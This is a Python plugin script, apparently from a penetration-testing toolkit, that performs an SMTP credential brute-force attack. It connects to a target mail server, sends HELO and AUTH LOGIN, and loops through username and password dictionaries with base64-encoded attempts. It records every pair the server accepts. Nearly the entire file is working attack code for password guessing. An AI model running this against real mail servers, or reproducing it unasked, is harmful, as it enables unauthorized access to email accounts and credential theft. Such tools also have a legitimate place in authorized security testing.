#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'orleven'



def get_script_info(data=None):
    script_info = {
        "name": "smtp Burst",
        "info": "This is a test.",
        "level": "low",
        "type": "info",
        "author": "orleven",
        "url": "",
        "keyword": "tag:iis",
        "source": 1
    }
    return script_info

def prove(data):
    '''
    data = {
        "target_host":"",
        "target_port":"",
        "proxy":"",
        "dic_one":"",
        "dic_two":"",
        "cookie":"",
        "url":"",
        "flag":"",
        "data":"",
        "":"",

    }

    '''

    import time,socket,re,base64
    socket.setdefaulttimeout(10)
    port = int(data['target_port']) if int(data['target_port']) !=0 else 25
    data['target_port'] = port



    # try:

    # s.connect((data['target_host'], port))
    # banner = s.recv(1024)
    # print(banner)
    #
    # answerUsername = str(s.recv(1024))
    # print(answerUsername)
    # if  "502 " in answerUsername:
    #     print("VRFY failed")
    # elif "250 " in answerUsername:
    #     print("VRFY command succeeded.\nProceeding to test usernames")
    # time.sleep(5)

    # except Exception as e:

    usernamedic = _read_dic(data['dic_one']) if 'dic_one' in data.keys() else  _read_dic('dict/smtp_usernames.txt')
    passworddic = _read_dic(data['dic_two']) if 'dic_two' in data.keys() else  _read_dic('dict/smtp_passwords.txt')
    for linef1 in usernamedic:
        username = linef1.strip('\r').strip('\n')
        for linef2 in passworddic:
            password = (
                linef2 if '%user%' not in linef2 else str(linef2).replace("%user%", str(username))).strip(
                '\r').strip('\n')
            try:

                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((data['target_host'], port))
                banner = str(s.recv(1024))
                emailaddress = '.'.join(data['target_host'].split('.')[1:])
                # print(banner)
                if "220" in banner:
                    s.send(bytes('HELO mail.' + emailaddress + ' \r\n', 'utf-8'))
                    helo = str(s.recv(1024))
                    # print(helo)
                    if "250" in helo:
                        s.send(bytes('auth login \r\n', 'utf-8'))
                        authanswer = str(s.recv(1024))
                        # print(authanswer)
                        if "334" in authanswer:
                            s.send(base64.b64encode(bytes(username ,encoding='utf-8'))+ b'\r\n')
                            useranswer = str(s.recv(1024))
                            # print(useranswer)
                            if "334" in useranswer:
                                s.send(base64.b64encode(bytes(password,encoding='utf-8'))+ b'\r\n')
                                # print(username + "/" + password)
                                passanswer = str(s.recv(1024))
                                # print(passanswer)
                                if "235" in passanswer:
                                    data['flag'] = True
                                    data['data'].append({"username": username, "password": password})
                                    data['res'].append({"info": username + "/" + password, "key": 'smtp'})
                                    return data
            except:

                pass

    return data


# def exec(data=None):
#     data = {}
#     data['data'] = 'This is a test.'
#     import time
#     import random
#     if random.randint(1, 10) > 10:
#         data['flag'] = True
#     else:
#         data['flag'] = False
#     return data

def _read_dic(dicname):
    with open(dicname, 'r') as f:
        return f.readlines()